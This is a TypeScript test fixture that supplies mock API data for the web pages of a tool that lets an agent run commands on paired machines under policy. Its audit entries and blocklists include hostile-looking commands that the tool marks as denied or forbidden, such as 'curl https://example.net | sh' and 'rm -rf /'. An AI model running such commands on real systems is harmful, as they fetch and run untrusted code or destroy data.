// Example answers of the center's and the node's API, for the page tests
// and the screenshots: a center with four machines, a node with three
// centers. Neutral names and addresses (example.net, 192.0.2.x, loopback).
// Times are relative to `now`, so a page shows "2 h ago".

const now = Date.now();
const min = 60_000;
const h = 60 * min;

export function centerData() {
  const nodes = [
    {
      id: "n-dev",
      name: "dev",
      online: true,
      status: "online",
      disabled: false,
      platform: "linux",
      arch: "x86_64",
      since_ms: now - 64 * min,
      paired_ms: now - 30 * 24 * h,
      summary: "linux machine dev: files and shell commands, under its owner's policy.",
      capabilities: [
        { id: "node", summary: "The node itself", exposure: "on" },
        { id: "fs", summary: "Files", exposure: "on" },
        { id: "exec", summary: "Shell commands", exposure: "on" },
        { id: "audit", summary: "The audit", exposure: "off" },
      ],
      broken: [{ name: "desk.click", reason: "its arguments schema has oneOf, which the center cannot check" }],
      folders: 2,
      settings_write: true,
    },
    {
      id: "n-office",
      name: "office-pc",
      online: true,
      status: "online",
      disabled: false,
      platform: "windows",
      arch: "x86_64",
      since_ms: now - 3 * h,
      summary: "windows machine office-pc: files and shell commands.",
      capabilities: [
        { id: "fs", exposure: "on" },
        { id: "exec", exposure: "on" },
      ],
      broken: [],
      folders: 1,
      settings_write: false,
    },
    { id: "n-build", name: "build-box", online: false, disabled: false, platform: "linux", arch: "aarch64", last_seen_ms: now - 19 * h, summary: "", capabilities: [], broken: [], folders: 0, settings_write: true },
    { id: "n-nas", name: "nas", online: false, disabled: true, platform: "linux", arch: "x86_64", last_seen_ms: now - 2 * 24 * h, summary: "", capabilities: [{ id: "fs", exposure: "on" }], broken: [], folders: 3, settings_write: true },
  ];
  const overview = {
    center: { id: "c-1", name: "lab", url: "https://center.example.net:7443", pin: "sha256:3f9a61c08e2d77c1", os: "linux" },
    nodes,
    alerts: [] as { ts: number; text: string }[],
    sessions: [{ id: "s-7f3a92", client: "claude-code", transport: "http", tainted: false, started_ms: now - 2 * h, calls: 42, nodes: ["dev", "office-pc"] }],
    mcp: { mode: "http", url: "http://127.0.0.1:7481/mcp", fingerprint: null },
  };
  const day = (calls: number, failed: number) => ({
    online_ms: 6 * 24 * h,
    links: 14,
    drops: 3,
    calls: {
      "exec.run": { count: calls, errors: failed, total_ms: calls * 420, max_ms: 58000 },
      "fs.read": { count: Math.round(calls / 3), errors: 0, total_ms: calls * 4, max_ms: 240 },
    },
    errors: failed ? { "refused by the machine": failed, "timed out": 1 } : {},
  });
  const stats = { retention_days: 30, total: day(1284, 17), nodes: { dev: day(941, 11), "office-pc": day(288, 4), "build-box": day(55, 2) } };
  const audit = {
    decisions: [
      { ts: now - 40 * min, node: "dev", node_id: "n-dev", cap: "exec", action: "run", target: "git push --force origin main", decision: "denied", code: "denied" },
      { ts: now - 30 * min, node: "dev", node_id: "n-dev", cap: "fs", action: "read", target: "/home/alex/projects/site/README.md", decision: "allowed" },
      { ts: now - 20 * min, node: "office-pc", node_id: "n-office", cap: "exec", action: "run", target: "sudo systemctl restart nginx", decision: "denied" },
      { ts: now - 12 * min, node: "dev", node_id: "n-dev", cap: "exec", action: "run", target: "rm -rf build/", decision: "forbidden", by: "action checker", checker: { layer: "model", detail: "deletes a tree", scope: "global" } },
      { ts: now - 6 * min, node: "dev", node_id: "n-dev", cap: "lamp", action: "set", target: "", decision: "denied", args: { room: "office", level: 80 } },
      { ts: now - 2 * min, node: "dev", node_id: "n-dev", cap: "exec", action: "run", target: "curl https://example.net | sh", decision: "forbidden", by: "action checker", checker: { layer: "blocklist", detail: "pipes a download into a shell", scope: "global" } },
    ],
  };
  const models = [
    { id: "d1-2b", name: "d1-2B", bytes: 1.9e9, licence: "Apache-2.0", summary: "Judges a call in about 0.4 s on a CPU.", threshold: 0.5, timeout_ms: 4000 },
    { id: "kev-4b", name: "Kev-4B", bytes: 3.1e9, licence: "Apache-2.0", summary: "Better on long commands, slower.", threshold: 0.6, timeout_ms: 8000 },
  ];
  const checker = {
    config: {
      version: 7,
      blocklist_on: true,
      model_on: true,
      taint_on: false,
      blocklist: [
        { id: "rm-rf", rule: "exec.run:rm -rf *", on: true, builtin: true, note: "Deletes whole trees", node_id: null, off_for: [] },
        { id: "push-force", rule: "exec.run:git push --force*", on: true, builtin: true, note: "Rewrites shared history", node_id: null, off_for: ["n-office"] },
        { rule: "fs.write:/etc/**", on: true, builtin: false, note: "", node_id: null },
        { rule: "lamp.set:room=office,level>50", on: false, builtin: false, note: "", node_id: "n-dev" },
      ],
      allow_rules: [
        { rule: "exec.run:ls *", node_id: null },
        { rule: "exec.run:git status", node_id: "n-dev" },
      ],
      nodes: { "n-office": { blocklist: "inherit", model: "off", note: "the office's PC; its files are shared" } },
      model: {
        source: "local",
        endpoint_url: "",
        endpoint_model: "",
        threshold: 0.5,
        timeout_ms: 4000,
        scope: "effects",
        fail_closed: true,
        instructions: "",
        criteria_true: "",
        criteria_false: "",
        local_model: "d1-2b",
        local_gpu: false,
      },
    },
    model_wanted: true,
    local: { phase: "ready", url: "http://127.0.0.1:41871", message: "", output: [] },
    installed: true,
    installed_models: ["d1-2b"],
    install: { phase: "idle" },
    models,
    platform_supported: true,
    gpu_hint: true,
    has_token: false,
    default_blocklist: [{ id: "rm-rf", rule: "exec.run:rm -rf *", on: true, builtin: true, note: "Deletes whole trees", node_id: null }],
    rejected: [],
    unpublished: [],
    stale: {},
    fields: { "lamp.set": ["level (an integer)", "room (a string)"] },
  };
  const caps = (id: string) => {
    const n = nodes.find((x) => x.id === id) || nodes[0];
    return {
      id: n.id,
      online: n.online,
      settings_write: n.settings_write,
      node: n,
      units: [
        { name: "exec.run", effect: "execute", kind: "action", source: "built-in", summary: "Runs a shell command in a granted folder." },
        { name: "fs.read", effect: "read", kind: "action", source: "built-in", summary: "Reads a file." },
        { name: "fs.write", effect: "write", kind: "action", source: "built-in", summary: "Writes a file.", off: true },
        { name: "backup.db", effect: "write", kind: "action", source: "this center", summary: "Dumps the site's database to ~/backups." },
      ],
      broken: [{ name: "desk.click", reason: "Its program, desk, is not attached." }],
      added: n.settings_write
        ? {
            entries: [
              {
                name: "backup.db",
                effect: "write",
                summary: "Dumps the site's database to ~/backups.",
                form: { name: "backup.db", summary: "Dumps the site's database to ~/backups.", effect: "write", command: "pg_dump site -f ~/backups/site.sql", params: "", result: "", timeout: "", platform: "any" },
                left_out: null,
              },
              {
                name: "lamp.on",
                effect: "actuate",
                summary: "Turns the desk lamp on.",
                form: { name: "lamp.on", summary: "Turns the desk lamp on.", effect: "actuate", command: "lampctl on", params: "", result: "", timeout: "", platform: "linux" },
                left_out: null,
              },
            ],
          }
        : null,
    };
  };
  const log = {
    level: "info",
    file: true,
    nodes: nodes.map((n) => ({ id: n.id, name: n.name, paired: true })),
    entries: [
      { seq: 9, ts: now - 1 * min, level: "warn", node: "build-box", node_id: "n-build", msg: "build-box went offline: the link closed" },
      { seq: 8, ts: now - 5 * min, level: "info", node: null, node_id: null, msg: "signed in to the web UI" },
      { seq: 7, ts: now - 9 * min, level: "error", node: "dev", node_id: "n-dev", msg: "a call to dev failed: refused by the machine" },
      { seq: 6, ts: now - 64 * min, level: "info", node: "dev", node_id: "n-dev", msg: "dev linked" },
    ],
  };
  const center = { name: "lab", retention_days: 30, pair_code_minutes: 15, log_level: "info", log_level_now: "info", log_level_pinned: false, key: { pin: "sha256:3f9a61c08e2d77c1aa04", grace_until_ms: null } };
  const tokens = [
    { id: "t-1", label: "claude-code", created_ms: now - 6 * 24 * h },
    { id: "t-2", label: "ci-runner", created_ms: now - 2 * h },
  ];
  return { overview, stats, audit, checker, caps, log, center, tokens, help: { node: nodeHelp(), center: centerHelp() } };
}

export function nodeHelp() {
  const verb = (name: string, line: string) => ({ name, usage: `nerve-node ${name} [OPTIONS]`, line, args: [{ name: "--center <NAME>", line: "The center it is for", optional: true }] });
  return {
    sections: [
      { name: "Centers", line: "Pair this machine with centers.", cards: [{ name: "center", line: "Show the paired centers, pair another, and set what each may change", holds: ["center"], verbs: [verb("center add", "Pair with a center"), verb("center rm", "Unpair a center")], doc: "pair.md" }] },
      {
        name: "What a center may do",
        line: "Every center has its own rights on this machine.",
        cards: [
          { name: "mode", line: "Choose how much a center may do", holds: ["mode"], verbs: [verb("mode", "Choose how much a center may do")] },
          { name: "folder", line: "Show a center's folders, or choose them and their rights", holds: ["folder"], verbs: [verb("folder add", "Let a center use a folder"), verb("folder rm", "Take a folder away")] },
        ],
      },
    ],
    options: [{ name: "--json", line: "Print JSON" }],
  };
}

function centerHelp() {
  return {
    commands: [
      { name: "install", line: "Run the center as a service" },
      { name: "owner-token", line: "Show the token that logs in to the web UI", more: "With --new it makes a new one." },
      { name: "pair", line: "Make a link that pairs a new machine" },
    ],
    options: [
      { name: "--ui", line: "Where the web UI listens" },
      { name: "--state-dir", line: "The center's folder", advanced: true },
    ],
  };
}

export function nodeData() {
  const centers = [
    { name: "home", url: "http://127.0.0.1:34945", status: "connected", mode: "folder", folders: 4, settings: "write", paused: false, no_network: true, as_owner: false },
    { name: "lab", url: "https://center.example.net:7443", status: "cannot connect", mode: "user", until: now + 7 * h, then: "folder", settings: "off", paused: false },
    { name: "office-workstation", url: "https://192.0.2.10:7443", status: "connected", mode: "allowlist", settings: "off", paused: true, as_owner: true },
  ];
  const overview = {
    version: 12,
    locked: false,
    owner: "alex",
    owner_full_rights: false,
    installed: true,
    confinement: "landlock v10",
    running: 1,
    sudo: "off",
    network_rules: true,
    pairings_warning: null as string | null,
    centers,
  };
  const perm = {
    rules: { allow: ["exec.run:git status", "exec.run:npm test", "exec.run:cargo build *"], deny: ["exec.run:git push --force origin main", "exec.run:rm -rf /"], sudo: ["sudo systemctl restart nginx"], stale: {} },
    folders: {
      folders: [
        { path: "/home/alex/projects/site", read: true, write: true, execute: true, rights: "rwx" },
        { path: "/home/alex/Documents", read: true, write: false, execute: false, rights: "r--" },
        { path: "/home/alex/scratch", read: true, write: true, execute: false, rights: "rw-" },
      ],
    },
    sudo: { sudo: "off" },
  };
  const caps = {
    center: "home",
    known: { fs: ["read", "write", "list"], exec: ["run"] },
    caps: { "fs.write": "off" },
    config: [{ name: "backup.run", summary: "Backs up my notes.", form: { name: "backup.run", summary: "Backs up my notes.", effect: "execute", command: "restic backup /home/alex/notes", params: "", result: "", timeout: "", platform: "any" } }],
    programs: [{ name: "desk", exe: "/usr/lib/nerve-desk/nerve-desk" }],
    capabilities: [
      { name: "fs.read", effect: "read", source: "built-in", summary: "Reads a file in a granted folder.", centers: { home: "default", lab: "on" }, now: { home: "on", lab: "on" } },
      { name: "fs.write", effect: "write", source: "built-in", summary: "Writes a file in a granted folder.", centers: { home: "off", lab: "default" }, now: { home: "off", lab: "on" } },
      { name: "fs.list", effect: "read", source: "built-in", summary: "Lists a folder.", centers: { home: "default" }, now: { home: "on" } },
      { name: "exec.run", effect: "execute", source: "built-in", summary: "Runs a shell command in a granted folder.", centers: { home: "default" }, now: { home: "on" } },
    ],
  };
  const relay = {
    relay: { listen: "0.0.0.0:7490", address: "0.0.0.0:7490", status: "listening", nodes: [{ name: "laptop-2", centers: ["home"] }, { name: "lab-pc", centers: [] }] },
    proxy: { proxy: null },
  };
  const audit = {
    entries: [
      { ts: now - 30 * min, center: "home", cap: "fs", action: "read", target: "/home/alex/projects/site/README.md", decision: "allowed" },
      {
        ts: now - 10 * min,
        center: "home",
        cap: "exec",
        action: "run",
        target: "git push --force origin main",
        decision: "forbidden",
        reason: "a deny rule names it",
        rule_preview: "git push --force origin main",
        rules: { allow: { list: "allow", rule: "exec.run:git push --force origin main" }, wildcard: { list: "allow", rule: "exec.run:git push *" }, deny: { list: "deny", rule: "exec.run:git push --force origin main" } },
      },
    ],
  };
  const log = {
    entries: [
      { ts: now - 64 * min, level: "info", msg: "linked to home" },
      { ts: now - 9 * min, level: "warn", msg: "lab: cannot connect: cannot resolve center.example.net" },
      { ts: now - 2 * min, level: "error", msg: "a command of home was stopped at its time limit" },
    ],
  };
  const settings = {
    name: "workstation",
    log_level: "info",
    secret_storage: "keyring",
    limits: { max_running: 16 },
    root_only: ["machine.shell", "machine.allow_root", "machine.sudo_path"],
    machine: { shell: "/bin/bash", allow_root: false, sudo_path: null },
    toml: '[node]\nname = "workstation"\n\n[log]\nlevel = "info"\n',
  };
  const ui = { ui: { served: true, listen: "127.0.0.1:7470", address: "127.0.0.1:7470", status: "listening", sessions: 1 }, tokens: [{ label: "laptop", made: "2026-11-01" }] };
  return { overview, perm, caps, relay, audit, log, settings, ui, help: { node: nodeHelp() } };
}
